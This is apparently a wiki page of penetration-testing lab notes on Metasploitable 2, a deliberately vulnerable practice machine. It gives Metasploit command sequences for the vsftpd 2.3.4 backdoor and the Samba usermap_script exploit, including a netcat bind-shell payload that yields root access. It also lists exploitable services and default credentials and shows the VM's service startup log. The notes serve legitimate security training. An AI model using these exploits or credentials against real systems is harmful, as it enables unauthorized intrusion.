@@ -1,0 +1,76 @@
+====== metasploit 2 ======
+
+1. Hacking the vsftpd 2.3.4 Backdoor (Port 21)
+
+An outdated FTP server on Metasploitable 2 contains a built-in backdoor that triggers when a username ending with a smiley face (:)) is entered.
+
+  * Start Metasploit on your attacker system: msfconsole
+  * Search and select the exploit module: use exploit/unix/ftp/vsftpd_234_backdoor
+  * View the required settings: show options
+  * Set the target IP address: set RHOSTS <target-ip> (replace with your Metasploitable 2 IP)
+  * Launch the attack: exploit or run
+  * Result: An interactive root shell opens instantly on port 6200, giving full control of the target.
+
+====== 2. Hacking Samba Usermap Script (Port 139/445) ======
+
+An older version of Samba on Metasploitable 2 misconfigures username map scripts, allowing remote code execution.
+  * Open Metasploit: msfconsole
+  * Select the Samba vulnerability module: use exploit/multi/samba/usermap_script
+  * View the required settings: show options
+  * Set the target IP address: set RHOSTS <target-ip>
+  * Set the local IP address: set LHOST <target-ip>
+  * Choose the payload: set PAYLOAD cmd/unix/bind_netcat
+  * Configure options if needed, then run the exploit: exploit
+  * Result: A remote command shell running with root privileges connects back or binds to a port on the target system.
+
+
+====== Common Network Services and Exploits ======
+  * Port 21 - vsftpd 2.3.4: exploit/unix/ftp/vsftpd_234_backdoor triggers a command shell via a smiley-face backdoor.
+  * Port 139/445 - Samba 3.0.20: exploit/multi/samba/usermap_script yields remote command execution.
+  * Port 1524 - IngresLock: Open bind shell giving direct root access without authentication.
+  * Port 2121 - ProFTPD 1.3.20: Vulnerable to backdoor execution or default/weak credential configurations.
+  * Port 8180 - Apache Tomcat: exploit/multi/http/tomcat_manager_login or default credentials (tomcat:tomcat) allowing WAR file deployment and remote code execution.
+
+Web Application and Database Vectors
+
+  * Port 80 - DVWA / Mutillidae: Houses application-layer flaws including SQL injection, cross-site scripting (XSS), and command injection.
+  * Port 3306 - MySQL: Accessible via weak credentials (root with blank password or msfadmin).
+  * Port 5432 - PostgreSQL 8.3.0: Vulnerable to default credential access and remote query execution.
+
+====== services ======
+
+<code bash>
+sh-3.2# ls
+bin  boot  cdrom  core  dev  etc  home  initrd  initrd.img  lib  lost+found  media  mnt  nohup.out  opt  proc  root  sbin  srv  sys  tmp  usr  var  vmlinuz
+sh-3.2# services.sh
+ * Starting web server apache2                                                                                                                              apache2: Could not reliably determine the server's fully qualified domain name, using 172.25.0.2 for ServerName
+                                                                                                                                                     [ OK ]
+ * Starting deferred execution scheduler atd                                                                                                         [ OK ]
+ * Starting periodic command scheduler crond                                                                                                         [ OK ]
+Starting distccd
+ * Starting MySQL database server mysqld                                                                                                             [ OK ]
+ * Checking for corrupt, not cleanly closed and upgrade needing tables.
+ * Configuring network interfaces...                                                                                                                 [ OK ]
+ * Starting portmap daemon...                                                                                                                        [ OK ]
+ * Starting Postfix Mail Transport Agent postfix                                                                                                     [ OK ]
+ * Starting PostgreSQL 8.3 database server                                                                                                           [ OK ]
+ * Starting ftp server proftpd                                                                                                                       [ OK ]
+Starting Samba daemons: nmbd smbd.
+Starting network management services: snmpd.
+ * Starting OpenBSD Secure Shell server sshd       snmpd[689]: error finding row index in _ifXTable_container_row_restore
+
+                                                                                                                                                     [ OK ]
+ * Starting system log daemon...                                                                                                                     [ OK ]
+ * Starting Tomcat servlet engine tomcat5.5                                                                                                          [ OK ]
+ * Starting internet superserver xinetd                                                                                                              [ OK ]
+ * Doing Wacom setup...                                                                                                                              [ OK ]
+ * Running local boot scripts (/etc/rc.local)                                                                                                        [ OK ]
+sh-3.2# nohup: nohup: appending output to `nohup.out'
+appending output to `nohup.out'
+</code>
+
+====== References ======
+
+[[https://www.hackingtutorials.org/metasploit-tutorials/metasploitable-2-vulnerability-assessment/]]
+[[https://westoahu.hawaii.edu/cyber/forensics-weekly-executive-summmaries/8424-2/]]
+[[https://medium.com/@mcnelson050/breaking-into-metasploitable2-a-hands-on-penetration-testing-lab-8f31168c017a]]
